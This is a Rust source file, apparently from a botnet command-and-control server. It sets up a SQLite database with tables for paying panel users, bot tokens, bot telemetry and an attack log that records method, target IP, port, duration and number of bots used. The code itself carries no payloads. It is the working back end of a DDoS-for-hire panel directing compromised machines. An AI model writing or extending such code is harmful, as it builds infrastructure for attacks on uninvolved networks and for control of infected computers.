use sqlx::{sqlite::SqlitePoolOptions, Pool, Sqlite};
use std::path::Path;
use tokio::fs;
use super::error::Result;

pub type DbPool = Pool<Sqlite>;

pub async fn init_database(database_url: &str) -> Result<DbPool> {
    // Ensure the directory exists
    if let Some(parent) = Path::new(database_url.trim_start_matches("sqlite:")).parent() {
        fs::create_dir_all(parent).await?;
    }

    let pool = SqlitePoolOptions::new()
        .max_connections(5)
        .connect(database_url)
        .await
        .or_else(|_| async {
            // If connection fails, try creating the file first
            let path = database_url.trim_start_matches("sqlite:");
            fs::File::create(path).await?;
            SqlitePoolOptions::new()
                .max_connections(5)
                .connect(database_url)
                .await
        })
        .map_err(|e| crate::modules::error::CncError::DatabaseError(e))?;

    run_migrations(&pool).await?;

    Ok(pool)
}

async fn run_migrations(pool: &DbPool) -> Result<()> {
    sqlx::query(
        r#"
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT NOT NULL UNIQUE,
            password_hash TEXT NOT NULL,
            role TEXT NOT NULL,
            expire_at DATETIME NOT NULL,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        );

        CREATE TABLE IF NOT EXISTS bot_tokens (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            token_hash TEXT NOT NULL UNIQUE,
            bot_uuid TEXT NOT NULL,
            arch TEXT NOT NULL,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            last_used_at DATETIME
        );

        CREATE TABLE IF NOT EXISTS attacks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            method TEXT NOT NULL,
            target_ip TEXT NOT NULL,
            target_port INTEGER NOT NULL,
            duration INTEGER NOT NULL,
            username TEXT NOT NULL,
            started_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            finished_at DATETIME,
            status TEXT DEFAULT 'running',
            bot_count INTEGER DEFAULT 0
        );

        CREATE TABLE IF NOT EXISTS audit_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT NOT NULL,
            action TEXT NOT NULL,
            target TEXT,
            ip_address TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            details TEXT
        );
        
        CREATE TABLE IF NOT EXISTS bot_telemetry (
            bot_uuid TEXT PRIMARY KEY,
            arch TEXT NOT NULL,
            os TEXT,
            version TEXT,
            cpu_usage REAL,
            ram_usage REAL,
            last_seen DATETIME DEFAULT CURRENT_TIMESTAMP
        );
        "#
    )
    .execute(pool)
    .await
    .map_err(|e| crate::modules::error::CncError::DatabaseError(e))?;

    Ok(())
}
